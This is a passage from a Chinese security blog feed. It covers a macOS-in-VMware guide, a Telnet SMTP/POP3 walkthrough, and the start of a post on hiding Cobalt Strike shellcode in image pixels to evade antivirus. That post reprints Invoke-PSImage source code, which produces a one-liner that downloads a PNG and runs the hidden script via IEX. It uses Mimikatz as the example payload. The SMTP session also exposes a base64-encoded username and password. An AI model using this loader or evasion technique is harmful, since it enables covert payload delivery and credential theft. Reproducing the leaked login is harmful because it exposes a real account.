<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126172049200.png" alt="image-20210126172049200"></p>
<p>等待运行完毕即可。</p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126172832152.png" alt="image-20210126172832152"></p>
<h5 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h5><p>打开Vmware虚拟机，新建虚拟机，选择macOS.Catalina.10.15.5.01.LY.iso，选择Apple Mac OS x的选项（未解锁是没有这个选项），之后默认即可，也可自己进行配置，直到完成。</p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126173349851.png" alt="image-20210126173349851"></p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126173627968.png" alt="image-20210126173627968"></p>
<p>完成后不要立即启动，先找到保存虚拟机文件的目录，找到后缀为 .vmx 的文件，进行编辑，在最后一行添加</p>
<p><code>smc.version = 0</code>，保存并退出。</p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126174636509.png" alt="image-20210126174636509"></p>
<p>启动虚拟机</p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126174747413.png" alt="image-20210126174747413"></p>
<p>选择语言，这里选择”简体中文”，点击”箭头”下一步</p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126175117143.png" alt="image-20210126175117143"></p>
<p>选择”磁盘工具”，点击”继续”进行对磁盘分区，注意分区安装系统的磁盘需要大于25GB以上。</p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126175242992.png" alt="image-20210126175242992"></p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126180200605.png" alt="image-20210126180200605"></p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126180544001.png" alt="image-20210126180544001"></p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126185615418.png" alt="image-20210126185615418"></p>
<p>点击”退出磁盘工具”</p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126182728141.png" alt="image-20210126182728141"></p>
<p>选择”安装macOS”,点击”继续”</p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126181159749.png" alt="image-20210126181159749"></p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126183123501.png" alt="image-20210126183123501"></p>
<p>安装完成后，弹出欢迎使用和设置界面，接下来就是一些设置，设置完即可进入苹果系统了</p>
<p><img src="/img/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/image-20210126194401893.png" alt="image-20210126194401893"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.cnblogs.com/deshun/p/10652385.html" target="_blank" rel="noopener">https://www.cnblogs.com/deshun/p/10652385.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>Telnet 测试邮件协议</title>
    <url>/2021/06/26/Telnet%20SMTP/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h5 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a>smtp</h5><p><img src="/img/Telnet%20SMTP/image-20210414093817371.png" alt="image-20210414093817371"></p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet smtp.163.com 25 <span class="comment"># telnet 连接</span></span><br><span class="line">220 163.com Anti-spam GT <span class="keyword">for</span> Coremail System (163com[20141201])</span><br><span class="line">helo 163.com <span class="comment">#163.com可以随便任意字符；EHLO 是扩展的简单邮件传输协议 (ESMTP) 命令动词，该命令动词是在 RFC 2821 中定义的。ESMTP 服务器可在初始连接时公布其功能。这些功能包括其最大的可接受邮件大小以及其支持的身份验证方法。HELO 是 RFC 821 中定义的旧版 SMTP 命令动词。多数 SMTP 邮件服务器都支持 ESMTP 和 EHLO。</span></span><br><span class="line">250 OK</span><br><span class="line">auth login	<span class="comment">#认证登陆</span></span><br><span class="line">334 dXNlcm5hbWU6</span><br><span class="line">aXR4aWFvd2VpNzU1	<span class="comment">#邮箱用户名base64编码</span></span><br><span class="line">334 UGFzc3dvcmQ6</span><br><span class="line">VUdFRVhRU0hGS0dBQ1hJRA==	<span class="comment">#邮箱密码(或授权码)base64编码</span></span><br><span class="line">235 Authentication successful</span><br><span class="line">mail from:&lt;itxiaowei755@163.com&gt; <span class="comment">#发件人</span></span><br><span class="line">250 Mail OK</span><br><span class="line">rcpt to:&lt;79898326@qq.com&gt;	<span class="comment">#收件人</span></span><br><span class="line">250 Mail OK</span><br><span class="line">data	<span class="comment">#开始写邮件</span></span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">from:itxiaowei755@163.com	<span class="comment">#发件人名称，此项可以任意填入，将显示在收件箱的发件人一栏</span></span><br><span class="line">to:79898326@qq.com	<span class="comment">#收件人名称，可任意填入，将显示在收件箱的收件人一栏。</span></span><br><span class="line">date:10/10/2021 <span class="comment">#发信日期</span></span><br><span class="line">subject:hello smtp	<span class="comment">#邮件主题</span></span><br><span class="line">					<span class="comment">#需空一行表示正文开始</span></span><br><span class="line">tyachedtothisletter.Imnowwritingtoaskifyoucanwriteareferencefor... <span class="comment">#正文内容</span></span><br><span class="line">.	<span class="comment">#.回车 发送邮件</span></span><br><span class="line">250 Mail OK queued as smtp7,C8CowABnYuAHRnZgpUBPXA--.60300S2 1618364054 <span class="comment">#返回250表示发送成功</span></span><br><span class="line">quit <span class="comment">#退出</span></span><br></pre></td></tr></table></figure>

<h5 id="pop3"><a href="#pop3" class="headerlink" title="pop3"></a>pop3</h5><p><img src="/img/Telnet%20SMTP/image-20210413180236367.png" alt="image-20210413180236367"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet pop.163.com 110 <span class="comment"># telnet连接</span></span><br><span class="line">user **** <span class="comment"># 用户名</span></span><br><span class="line">pass **** <span class="comment"># 密码</span></span><br><span class="line">+OK 24 message(s) [643260 byte(s)] <span class="comment"># 成功会显示OK 24代表24封邮件 643260代表总邮件的字节数</span></span><br><span class="line"></span><br><span class="line">命令列表</span><br><span class="line"><span class="built_in">stat</span> <span class="comment">#查看统计,执行后,POP3服务器会响应一个正确应答,它以“+OK”开头,接着是两个数字,第一个是邮件数目,第二个是邮件的大小</span></span><br><span class="line">list <span class="comment">#格式list [n] 参数n可选，n为邮件编号；查看邮件列表</span></span><br><span class="line">uidl <span class="comment">#格式uidl [n] 参数n可选，n为邮件编号；查看邮件唯一邮件标识码</span></span><br><span class="line">retr <span class="comment">#格式retr [n] 参数n可选，n为邮件编号；查看邮件的内容</span></span><br><span class="line">dele <span class="comment">#格式dele [n] 参数n可选，n为邮件编号；删除指定的邮件(注意:dele n命令只是给邮件做上删除标记,只有在执行quit命令之后,邮件才会真正删除)</span></span><br><span class="line">top  <span class="comment">#格式top [n][m]  参数n m 必选，n为邮件编号，m为行数；读取指定邮件正文的行数,如果m=0,则只读出邮件的邮件头部分</span></span><br><span class="line">noop <span class="comment">#POP3服务器不执行任何操作,仅返回一个正确响应"+OK"</span></span><br><span class="line">quit <span class="comment">#退出</span></span><br></pre></td></tr></table></figure>

<h5 id="错误代码"><a href="#错误代码" class="headerlink" title="错误代码"></a>错误代码</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>xx代码：</span><br><span class="line">  <span class="number">421</span>个#<span class="number">4.4</span><span class="number">.5</span>此时的许多TLS会话</span><br><span class="line">  <span class="number">421</span>个#<span class="number">4.4</span><span class="number">.5</span>从您的主机的许多连接</span><br><span class="line">  <span class="number">421</span>个#<span class="number">4.4</span><span class="number">.5</span>对此的许多连接主机</span><br><span class="line">  <span class="number">421</span>个#<span class="number">4.4</span><span class="number">.5</span>对此监听程序的许多连接</span><br><span class="line">  <span class="number">421</span>个#<span class="number">4.</span>x<span class="number">.2</span>此会话的许多消息</span><br><span class="line">  <span class="number">421</span>不可用&lt;hostname&gt;的服务，关闭处理信道</span><br><span class="line">  <span class="number">421</span>超出了允许的连接时间</span><br><span class="line">  <span class="number">421</span>超过了坏SMTP命令限制，断开</span><br><span class="line">  评估许可证超时的<span class="number">421</span></span><br><span class="line">  <span class="number">451</span>个#<span class="number">4.3</span><span class="number">.0</span>服务器错误</span><br><span class="line">  <span class="number">452</span>个#<span class="number">4.3</span><span class="number">.1</span>全双工的队列</span><br><span class="line">  <span class="number">452</span>种#<span class="number">4.3</span><span class="number">.1</span>以后服务器资源低的再试一次</span><br><span class="line">  <span class="number">452</span>个#<span class="number">4.3</span><span class="number">.1</span>临时系统错误(<span class="number">12</span>)</span><br><span class="line">  <span class="number">452</span>个#<span class="number">4.5</span><span class="number">.3</span>许多收件人</span><br><span class="line">  <span class="number">454</span> TLS不可用由于一个临时原因</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>xx代码：</span><br><span class="line">  <span class="number">500</span>个#<span class="number">5.5</span><span class="number">.1</span>没被认可的命令</span><br><span class="line">  <span class="number">500</span>太长的线路</span><br><span class="line">  <span class="number">501</span> #<span class="number">5.0</span><span class="number">.0</span> EHLO要求域地址</span><br><span class="line">  <span class="number">501</span>个#<span class="number">5.5</span><span class="number">.2</span>语法错误XXX</span><br><span class="line">  对验证命令的<span class="number">501</span>个#<span class="number">5.5</span><span class="number">.4</span>无效参数</span><br><span class="line">  <span class="number">501</span>未知xxx命令</span><br><span class="line">  <span class="number">501</span>未知的选项XXX</span><br><span class="line">  <span class="number">501</span>未知值XXX</span><br><span class="line">  不可用<span class="number">503</span> #<span class="number">5.3</span><span class="number">.3</span>的验证</span><br><span class="line">  在邮件处理时没允许的<span class="number">503</span> #<span class="number">5.5</span><span class="number">.0</span>验证</span><br><span class="line">  已经验证的<span class="number">503</span>个#<span class="number">5.5</span><span class="number">.0</span></span><br><span class="line">  首先<span class="number">503</span> #<span class="number">5.5</span><span class="number">.1</span> MAIL</span><br><span class="line">  首先<span class="number">503</span> #<span class="number">5.5</span><span class="number">.1</span> RCPT</span><br><span class="line">  <span class="number">503</span> commandsDATA Bad顺序在mailmerge处理内的</span><br><span class="line">  <span class="number">503</span> commandsXPRT Bad顺序在无格式处理内的</span><br><span class="line">  <span class="number">503</span>接收零件的commandsnow Bad顺序</span><br><span class="line">  <span class="number">503</span>不在mailmerge处理</span><br><span class="line">  <span class="number">504</span>个#<span class="number">5.5</span><span class="number">.1</span>验证机制XXX不是可用的</span><br><span class="line">  <span class="number">504</span>命令参数XXX无法识别</span><br><span class="line">  <span class="number">504</span>个无效XDFN语法</span><br><span class="line">  <span class="number">504</span>无效部件号</span><br><span class="line">  <span class="number">504</span>无效部件号XXX</span><br><span class="line">  <span class="number">504</span>没有指定的可变值</span><br><span class="line">  仍然未命中其他<span class="number">504</span>的部分</span><br><span class="line">  <span class="number">504</span>保留变量名称</span><br><span class="line">  <span class="number">504</span>在*parts语法的语法错误</span><br><span class="line">  <span class="number">504</span>个XDFN命令不能包含零字符</span><br><span class="line">  <span class="number">530</span>个#<span class="number">5.7</span><span class="number">.0</span>必须首先发出STARTTLS命令</span><br><span class="line">  <span class="number">530</span>个#<span class="number">5.7</span><span class="number">.0</span>此发送方必须首先发出STARTTLS命令</span><br><span class="line">  要求的<span class="number">530</span>验证</span><br><span class="line">  <span class="number">538</span>个#<span class="number">5.7</span><span class="number">.11</span>要求的加密</span><br><span class="line">  <span class="number">552</span>个#<span class="number">5.3</span><span class="number">.4</span>信息标题大小超过限制</span><br><span class="line">  <span class="number">552</span>个#<span class="number">5.3</span><span class="number">.4</span>消息大小超过限制</span><br><span class="line">  <span class="number">552</span>超过的大小限制</span><br><span class="line">  <span class="number">554</span>个#<span class="number">5.3</span><span class="number">.0</span>服务器错误</span><br><span class="line">  <span class="number">554</span>许多跳</span><br><span class="line">  <span class="number">554</span>消息主题包含非法仅有的CR/LF字符。</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>mail</tag>
      </tags>
  </entry>
  <entry>
    <title>Shellcode 隐写像素RGB免杀上线到 CobaltStrike</title>
    <url>/2021/06/26/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>看到一篇推文隐写RGB来进行绕过杀软，记录一下~</p>
<a id="more"></a>

<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">攻击机地址：<span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span></span><br><span class="line">cobaltstrike v4<span class="number">.1</span></span><br><span class="line"></span><br><span class="line">VPS地址：*.*.*.*</span><br><span class="line"></span><br><span class="line">靶机系统: Windows <span class="number">10</span></span><br><span class="line">靶机地址: <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>

<h4 id="隐写RGB示例"><a href="#隐写RGB示例" class="headerlink" title="隐写RGB示例"></a>隐写RGB示例</h4><h5 id="Invoke-PSImage下载"><a href="#Invoke-PSImage下载" class="headerlink" title="Invoke-PSImage下载"></a>Invoke-PSImage下载</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">下载地址： https:<span class="regexp">//gi</span>thub.com<span class="regexp">/dayuxiyou/</span>Invoke-PSImage</span><br></pre></td></tr></table></figure>

<p>Invoke-PSImage.ps1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-PSImage</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Embeds a PowerShell script in an image and generates a oneliner to execute it.</span></span><br><span class="line"><span class="comment">Author:  Barrett Adams (@peewpw)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This tool can either create an image with just the target data, or can embed the payload in</span></span><br><span class="line"><span class="comment">an existing image. When embeding, the least significant 4 bits of 2 color values (2 of RGB) in</span></span><br><span class="line"><span class="comment">each pixel (for as many pixels as are needed for the payload). Image quality will suffer as</span></span><br><span class="line"><span class="comment">a result, but it still looks decent. The image is saved as a PNG, and can be losslessly</span></span><br><span class="line"><span class="comment">compressed without affecting the ability to execute the payload as the data is stored in the</span></span><br><span class="line"><span class="comment">colors themselves. It can accept most image types as input, but output will always be a PNG</span></span><br><span class="line"><span class="comment">because it needs to be lossless.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Script</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The path to the script to embed in the Image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Out</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The file to save the resulting image to (image will be a PNG)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Image</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The image to embed the script in. (optional)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER WebRequest</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Output a command for reading the image from the web using Net.WebClient.</span></span><br><span class="line"><span class="comment">You will need to host the image and insert the URL into the command.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER PictureBox</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Output a command for reading the image from the web using System.Windows.Forms.PictureBox.</span></span><br><span class="line"><span class="comment">You will need to host the image and insert the URL into the command.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PS&gt;Import-Module .\Invoke-PSImage.ps1</span></span><br><span class="line"><span class="comment">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg </span></span><br><span class="line"><span class="comment">   [Oneliner to execute from a file]</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="function">[<span class="type">CmdletBinding</span>()] <span class="keyword">Param</span></span> (</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Position</span> = <span class="number">0</span>, <span class="type">Mandatory</span> = <span class="variable">$True</span>)]</span><br><span class="line">        [<span class="built_in">String</span>]</span><br><span class="line">        <span class="variable">$Script</span>,</span><br><span class="line">    </span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Position</span> = <span class="number">1</span>, <span class="type">Mandatory</span> = <span class="variable">$True</span>)]</span><br><span class="line">        [<span class="built_in">String</span>]</span><br><span class="line">        <span class="variable">$Out</span>,</span><br><span class="line">    </span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Position</span> = <span class="number">2</span>, <span class="type">Mandatory</span> = <span class="variable">$False</span>)]</span><br><span class="line">        [<span class="built_in">String</span>]</span><br><span class="line">        <span class="variable">$Image</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">switch</span>] <span class="variable">$WebClient</span>,</span><br><span class="line">        </span><br><span class="line">        [<span class="type">switch</span>] <span class="variable">$PictureBox</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># Stop if we hit an error instead of making more errors</span></span><br><span class="line">    <span class="variable">$ErrorActionPreference</span> = <span class="string">"Stop"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load some assemblies</span></span><br><span class="line">    [<span class="built_in">void</span>] [<span class="type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="string">"System.Drawing"</span>)</span><br><span class="line">    [<span class="built_in">void</span>] [<span class="type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="string">"System.Web"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Normalize paths beacuse powershell is sometimes bad with them.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="operator">-Not</span> [<span class="type">System.IO.Path</span>]::IsPathRooted(<span class="variable">$Script</span>))&#123;</span><br><span class="line">        <span class="variable">$Script</span> = [<span class="type">System.IO.Path</span>]::GetFullPath((<span class="built_in">Join-Path</span> (<span class="built_in">Get-Location</span>) <span class="variable">$Script</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="operator">-Not</span> [<span class="type">System.IO.Path</span>]::IsPathRooted(<span class="variable">$Out</span>))&#123;</span><br><span class="line">        <span class="variable">$Out</span> = [<span class="type">System.IO.Path</span>]::GetFullPath((<span class="built_in">Join-Path</span> (<span class="built_in">Get-Location</span>) <span class="variable">$Out</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$testurl</span> = <span class="string">"http://example.com/"</span> + [<span class="type">System.IO.Path</span>]::GetFileName(<span class="variable">$Out</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read in the script</span></span><br><span class="line">    <span class="variable">$ScriptBlockString</span> = [<span class="type">IO.File</span>]::ReadAllText(<span class="variable">$Script</span>)</span><br><span class="line">    <span class="variable">$in</span> = [<span class="type">ScriptBlock</span>]::Create(<span class="variable">$ScriptBlockString</span>)</span><br><span class="line">    <span class="variable">$payload</span> = [<span class="type">system.Text.Encoding</span>]::ASCII.GetBytes(<span class="variable">$in</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$Image</span>) &#123;</span><br><span class="line">        <span class="comment"># Normalize paths beacuse powershell is sometimes bad with them.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">-Not</span> [<span class="type">System.IO.Path</span>]::IsPathRooted(<span class="variable">$Image</span>))&#123;</span><br><span class="line">            <span class="variable">$Image</span> = [<span class="type">System.IO.Path</span>]::GetFullPath((<span class="built_in">Join-Path</span> (<span class="built_in">Get-Location</span>) <span class="variable">$Image</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Read the image into a bitmap</span></span><br><span class="line">        <span class="variable">$img</span> = <span class="built_in">New-Object</span> System.Drawing.Bitmap(<span class="variable">$Image</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable">$width</span> = <span class="variable">$img</span>.Size.Width</span><br><span class="line">        <span class="variable">$height</span> = <span class="variable">$img</span>.Size.Height</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Lock the bitmap in memory so it can be changed programmatically.</span></span><br><span class="line">        <span class="variable">$rect</span> = <span class="built_in">New-Object</span> System.Drawing.Rectangle(<span class="number">0</span>, <span class="number">0</span>, <span class="variable">$width</span>, <span class="variable">$height</span>);</span><br><span class="line">        <span class="variable">$bmpData</span> = <span class="variable">$img</span>.LockBits(<span class="variable">$rect</span>, [<span class="type">System.Drawing.Imaging.ImageLockMode</span>]::ReadWrite, <span class="variable">$img</span>.PixelFormat)</span><br><span class="line">        <span class="variable">$ptr</span> = <span class="variable">$bmpData</span>.Scan0</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Copy the RGB values to an array for easy modification</span></span><br><span class="line">        <span class="variable">$bytes</span>  = [<span class="type">Math</span>]::Abs(<span class="variable">$bmpData</span>.Stride) * <span class="variable">$img</span>.Height</span><br><span class="line">        <span class="variable">$rgbValues</span> = <span class="built_in">New-Object</span> byte[] <span class="variable">$bytes</span>;</span><br><span class="line">        [<span class="type">System.Runtime.InteropServices.Marshal</span>]::Copy(<span class="variable">$ptr</span>, <span class="variable">$rgbValues</span>, <span class="number">0</span>, <span class="variable">$bytes</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check that the payload fits in the image </span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$bytes</span>/<span class="number">2</span> <span class="operator">-lt</span> <span class="variable">$payload</span>.Length) &#123;</span><br><span class="line">            <span class="built_in">Write-Error</span> <span class="string">"Image not large enough to contain payload!"</span></span><br><span class="line">            <span class="variable">$img</span>.UnlockBits(<span class="variable">$bmpData</span>)</span><br><span class="line">            <span class="variable">$img</span>.Dispose()</span><br><span class="line">            <span class="keyword">Break</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Generate a random string to use to fill other pixel info in the picture.</span></span><br><span class="line">        <span class="comment"># (Calling get-random everytime is too slow)</span></span><br><span class="line">        <span class="variable">$randstr</span> = [<span class="type">System.Web.Security.Membership</span>]::GeneratePassword(<span class="number">128</span>,<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$randb</span> = [<span class="type">system.Text.Encoding</span>]::ASCII.GetBytes(<span class="variable">$randstr</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># loop through the RGB array and copy the payload into it</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$counter</span> = <span class="number">0</span>; <span class="variable">$counter</span> <span class="operator">-lt</span> (<span class="variable">$rgbValues</span>.Length)/<span class="number">3</span>; <span class="variable">$counter</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$counter</span> <span class="operator">-lt</span> <span class="variable">$payload</span>.Length)&#123;</span><br><span class="line">                <span class="variable">$paybyte1</span> = [<span class="type">math</span>]::Floor(<span class="variable">$payload</span>[<span class="variable">$counter</span>]/<span class="number">16</span>)</span><br><span class="line">                <span class="variable">$paybyte2</span> = (<span class="variable">$payload</span>[<span class="variable">$counter</span>] <span class="operator">-band</span> <span class="number">0</span>x0f)</span><br><span class="line">                <span class="variable">$paybyte3</span> = (<span class="variable">$randb</span>[(<span class="variable">$counter</span>+<span class="number">2</span>)%<span class="number">109</span>] <span class="operator">-band</span> <span class="number">0</span>x0f)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$paybyte1</span> = (<span class="variable">$randb</span>[<span class="variable">$counter</span>%<span class="number">113</span>] <span class="operator">-band</span> <span class="number">0</span>x0f)</span><br><span class="line">                <span class="variable">$paybyte2</span> = (<span class="variable">$randb</span>[(<span class="variable">$counter</span>+<span class="number">1</span>)%<span class="number">67</span>] <span class="operator">-band</span> <span class="number">0</span>x0f)</span><br><span class="line">                <span class="variable">$paybyte3</span> = (<span class="variable">$randb</span>[(<span class="variable">$counter</span>+<span class="number">2</span>)%<span class="number">109</span>] <span class="operator">-band</span> <span class="number">0</span>x0f)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$rgbValues</span>[(<span class="variable">$counter</span>*<span class="number">3</span>)] = (<span class="variable">$rgbValues</span>[(<span class="variable">$counter</span>*<span class="number">3</span>)] <span class="operator">-band</span> <span class="number">0</span>xf0) <span class="operator">-bor</span> <span class="variable">$paybyte1</span></span><br><span class="line">            <span class="variable">$rgbValues</span>[(<span class="variable">$counter</span>*<span class="number">3</span>+<span class="number">1</span>)] = (<span class="variable">$rgbValues</span>[(<span class="variable">$counter</span>*<span class="number">3</span>+<span class="number">1</span>)] <span class="operator">-band</span> <span class="number">0</span>xf0) <span class="operator">-bor</span> <span class="variable">$paybyte2</span></span><br><span class="line">            <span class="variable">$rgbValues</span>[(<span class="variable">$counter</span>*<span class="number">3</span>+<span class="number">2</span>)] = (<span class="variable">$rgbValues</span>[(<span class="variable">$counter</span>*<span class="number">3</span>+<span class="number">2</span>)] <span class="operator">-band</span> <span class="number">0</span>xf0) <span class="operator">-bor</span> <span class="variable">$paybyte3</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Copy the array of RGB values back to the bitmap</span></span><br><span class="line">        [<span class="type">System.Runtime.InteropServices.Marshal</span>]::Copy(<span class="variable">$rgbValues</span>, <span class="number">0</span>, <span class="variable">$ptr</span>, <span class="variable">$bytes</span>)</span><br><span class="line">        <span class="variable">$img</span>.UnlockBits(<span class="variable">$bmpData</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Write the image to a file</span></span><br><span class="line">        <span class="variable">$img</span>.Save(<span class="variable">$Out</span>, [<span class="type">System.Drawing.Imaging.ImageFormat</span>]::Png)</span><br><span class="line">        <span class="variable">$img</span>.Dispose()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Get a bunch of numbers we need to use in the oneliner</span></span><br><span class="line">        <span class="variable">$rows</span> = [<span class="type">math</span>]::Ceiling(<span class="variable">$payload</span>.Length/<span class="variable">$width</span>)</span><br><span class="line">        <span class="variable">$array</span> = (<span class="variable">$rows</span>*<span class="variable">$width</span>)</span><br><span class="line">        <span class="variable">$lrows</span> = (<span class="variable">$rows</span><span class="literal">-1</span>)</span><br><span class="line">        <span class="variable">$lwidth</span> = (<span class="variable">$width</span><span class="literal">-1</span>)</span><br><span class="line">        <span class="variable">$lpayload</span> = (<span class="variable">$payload</span>.Length<span class="literal">-1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$WebClient</span>) &#123;</span><br><span class="line">            <span class="variable">$pscmd</span> = <span class="string">"sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"<span class="variable">$testurl</span>`"));`$o=a Byte[] <span class="variable">$array</span>;(0..<span class="variable">$lrows</span>)|%&#123;foreach(`$x in(0..<span class="variable">$lwidth</span>))&#123;`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*<span class="variable">$width</span>+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))&#125;&#125;;IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..<span class="variable">$lpayload</span>]))"</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span>(<span class="variable">$PictureBox</span>) &#123;</span><br><span 